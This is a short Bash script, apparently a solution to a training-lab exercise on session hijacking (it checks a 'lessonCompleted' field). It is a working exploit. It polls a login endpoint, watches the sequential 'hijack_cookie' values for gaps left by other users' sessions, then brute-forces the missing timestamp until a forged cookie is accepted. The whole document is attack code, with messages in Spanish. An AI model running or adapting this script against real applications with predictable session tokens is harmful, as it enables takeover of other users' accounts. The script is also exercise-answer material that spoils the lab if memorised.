#!/bin/bash
limit=$2
diff=$4
hijack_cookie_prev=''
hijack_cookie=''
url=$5
for i in $(seq 1 $limit)
do 
	hijack_cookie_prev=$hijack_cookie
	hijack_cookie=$(curl -i -s -k -X  'POST' \
		-H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' \
		-H "Cookie: JSESSIONID=$1"  \
		--data-raw $'username=foo&password=bar' \
		$url \
		2>/dev/null | grep -i '^Set-Cookie:' | grep -oP '(?<=hijack_cookie=)[^;]+')
	
	parte1=${hijack_cookie%-*}
	parte1=$((parte1))
	diferencia1=$(( parte1 - parte1_tmp ))		

	parte2=${hijack_cookie#*-}	
	parte2=$((parte2))
	diferencia2=$(( parte2 - parte2_tmp ))
	diferencia2_tmp=$diferencia2

	parte1_tmp=$parte1
	parte2_tmp=$parte2	
	
	if [ $diferencia1 -gt $diff ] && (($parte1 != $diferencia1)); then
		echo "hijack_cookie=$parte1($diferencia1)-$parte2_tmp($diferencia2)! ¡Alguien estuvo antes!"
		parte1_aumt=$((parte1-1))
		hijack_cookie_temp="hijack_cookie=$parte1_aumt-?"
		echo "¿hijack_cookie=$parte1_aumt-?"
		for i in $(seq 1 $((diferencia2_tmp)))
		do
			marca_temporal=$((parte2_tmp-i))
			hijack_cookie_temp="hijack_cookie=$parte1_aumt-$marca_temporal"
			echo "$hijack_cookie_temp"
			salida=$(curl -v -s -k -X  'POST' \
			-H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' \
			-H "Cookie: JSESSIONID=$1; $hijack_cookie_temp;"  \
			--data-raw $'username=foo&password=bar' \
			$url \
			2>/dev/null)
			lessonCompleted=$(echo $salida | jq -r '.lessonCompleted')
			if ($lessonCompleted); then
				echo "Listo! la cookie era $hijack_cookie_temp"
				echo $salida | jq .
				echo "hijack_cookie=$hijack_cookie_prev"
				echo "$hijack_cookie_temp<--"
				echo "hijack_cookie=$hijack_cookie"				
			else
				printf '\nNope!\n\n'
			fi
		done		
	  	break
	else
	  echo "hijack_cookie=$parte1_tmp($diferencia1)-$parte2_tmp($diferencia2)"
	fi	
	diferencia2_tmp=$diferencia2
	sleep $3
done
